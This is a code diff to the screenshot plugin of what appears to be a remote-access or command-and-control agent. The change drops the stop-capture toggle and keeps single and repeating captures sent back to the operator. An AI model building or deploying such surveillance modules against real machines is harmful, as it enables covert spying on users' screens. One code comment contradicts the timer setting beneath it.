@@ -25,50 +25,41 @@ namespace Plugins
         {
 
             int intervalInSeconds = 0; // Default interval should be 0 to just take one
-            if (this.isRunning)
+
+            if (args.ContainsKey("interval") && int.TryParse(args["interval"], out intervalInSeconds))
             {
-                cts.Cancel();
-                this.isRunning = false;
+                // Check if the interval is specified and non-negative
+                if (intervalInSeconds < 0)
+                {
+                    TaskResponseHandler.Write("Invalid interval value. It must be a non-negative integer.", args["task-id"], true, "error");
+                    return;
+                }
+
+                if (intervalInSeconds == 0)
+                {
+                    // If interval is 0, take just one screenshot immediately
+                    CaptureAndSendScreenshot(args);
+                    return;
+                }
+
+                // Initialize the timer to capture screenshots at the specified interval
+                screenshotTimer = new System.Timers.Timer(intervalInSeconds * 1000); // Convert seconds to milliseconds
+                screenshotTimer.Elapsed += (sender, e) => CaptureAndSendScreenshot(args);
+
+                // Set AutoReset to false for a one-time execution if the interval is greater than 0
+                screenshotTimer.AutoReset = intervalInSeconds > 0;
+                screenshotTimer.Enabled = true;
+                TaskResponseHandler.AddResponse(new ResponseResult
+                {
+                    completed = true,
+                    user_output = $"Capturing screenshots every {intervalInSeconds} seconds.",
+                    task_id = args["task-id"],
+                });
             }
             else
             {
-                cts = new CancellationTokenSource();
-
-                if (args.ContainsKey("interval") && int.TryParse(args["interval"], out intervalInSeconds))
-                {
-                    // Check if the interval is specified and non-negative
-                    if (intervalInSeconds < 0)
-                    {
-                        TaskResponseHandler.Write("Invalid interval value. It must be a non-negative integer.", args["task-id"], true, "error");
-                        return;
-                    }
-
-                    if (intervalInSeconds == 0)
-                    {
-                        // If interval is 0, take just one screenshot immediately
-                        CaptureAndSendScreenshot(args);
-                        return;
-                    }
-
-                    // Initialize the timer to capture screenshots at the specified interval
-                    screenshotTimer = new System.Timers.Timer(intervalInSeconds * 1000); // Convert seconds to milliseconds
-                    screenshotTimer.Elapsed += (sender, e) => CaptureAndSendScreenshot(args);
-
-                    // Set AutoReset to false for a one-time execution if the interval is greater than 0
-                    screenshotTimer.AutoReset = intervalInSeconds > 0;
-                    screenshotTimer.Enabled = true;
-                    TaskResponseHandler.AddResponse(new ResponseResult
-                    {
-                        completed = true,
-                        user_output = $"Capturing screenshots every {intervalInSeconds} seconds.",
-                        task_id = args["task-id"],
-                    });
-                }
-                else
-                {
-                    // If interval is not specified, take just one screenshot immediately
-                    CaptureAndSendScreenshot(args);
-                }
+                // If interval is not specified, take just one screenshot immediately
+                CaptureAndSendScreenshot(args);
             }
         }
 
